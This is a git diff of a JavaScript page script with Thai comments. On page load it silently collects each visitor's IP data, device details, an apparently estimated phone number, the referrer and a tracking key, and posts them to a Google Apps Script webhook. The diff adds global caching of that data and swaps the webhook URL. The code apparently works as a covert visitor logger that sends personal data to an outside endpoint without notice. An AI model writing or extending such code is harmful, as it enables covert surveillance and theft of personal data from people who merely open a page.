@@ -22,6 +22,10 @@ function getUrlParameters() {
   }
 }
 
+// Global cache for initial data
+window.cachedIpData = null;
+window.cachedDeviceInfo = null;
+
 // ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ1
 (function() {
   // เก็บข้อมูลทั่วไป
@@ -73,11 +77,15 @@ function getUrlParameters() {
       estimatePhoneNumber().catch(() => null)
     ])
     .then(([ipData, phoneInfo]) => {
+      // Cache the fetched data
+      window.cachedIpData = ipData;
+      window.cachedDeviceInfo = allDeviceData;
+
       // เก็บข้อมูลที่จำเป็นทั้งหมด
       dataToSend = {
         timestamp: timestamp,
-        ip: ipData,
-        deviceInfo: allDeviceData,
+        ip: ipData, // Use fetched IP data
+        deviceInfo: allDeviceData, // Use fetched device data
         phoneInfo: phoneInfo,
         referrer: referrer,
         trackingKey: trackingKey || "ไม่มีค่า",
@@ -916,7 +924,7 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxe8LFWRRFx_VdfyjK-Eq6ikegQUMPn6qnxRBHkI9KN1RSOB1p5jJcvIPYV3kgoowdn/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxyuQl-FhQDpp1i4ks6Tnh16R0oqhtecdl3PT0hL6ZO9_DyKuqM1EvEOyrB9x0odRHv/exec';
 
   // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
   if (!dataToSend.requestId) {
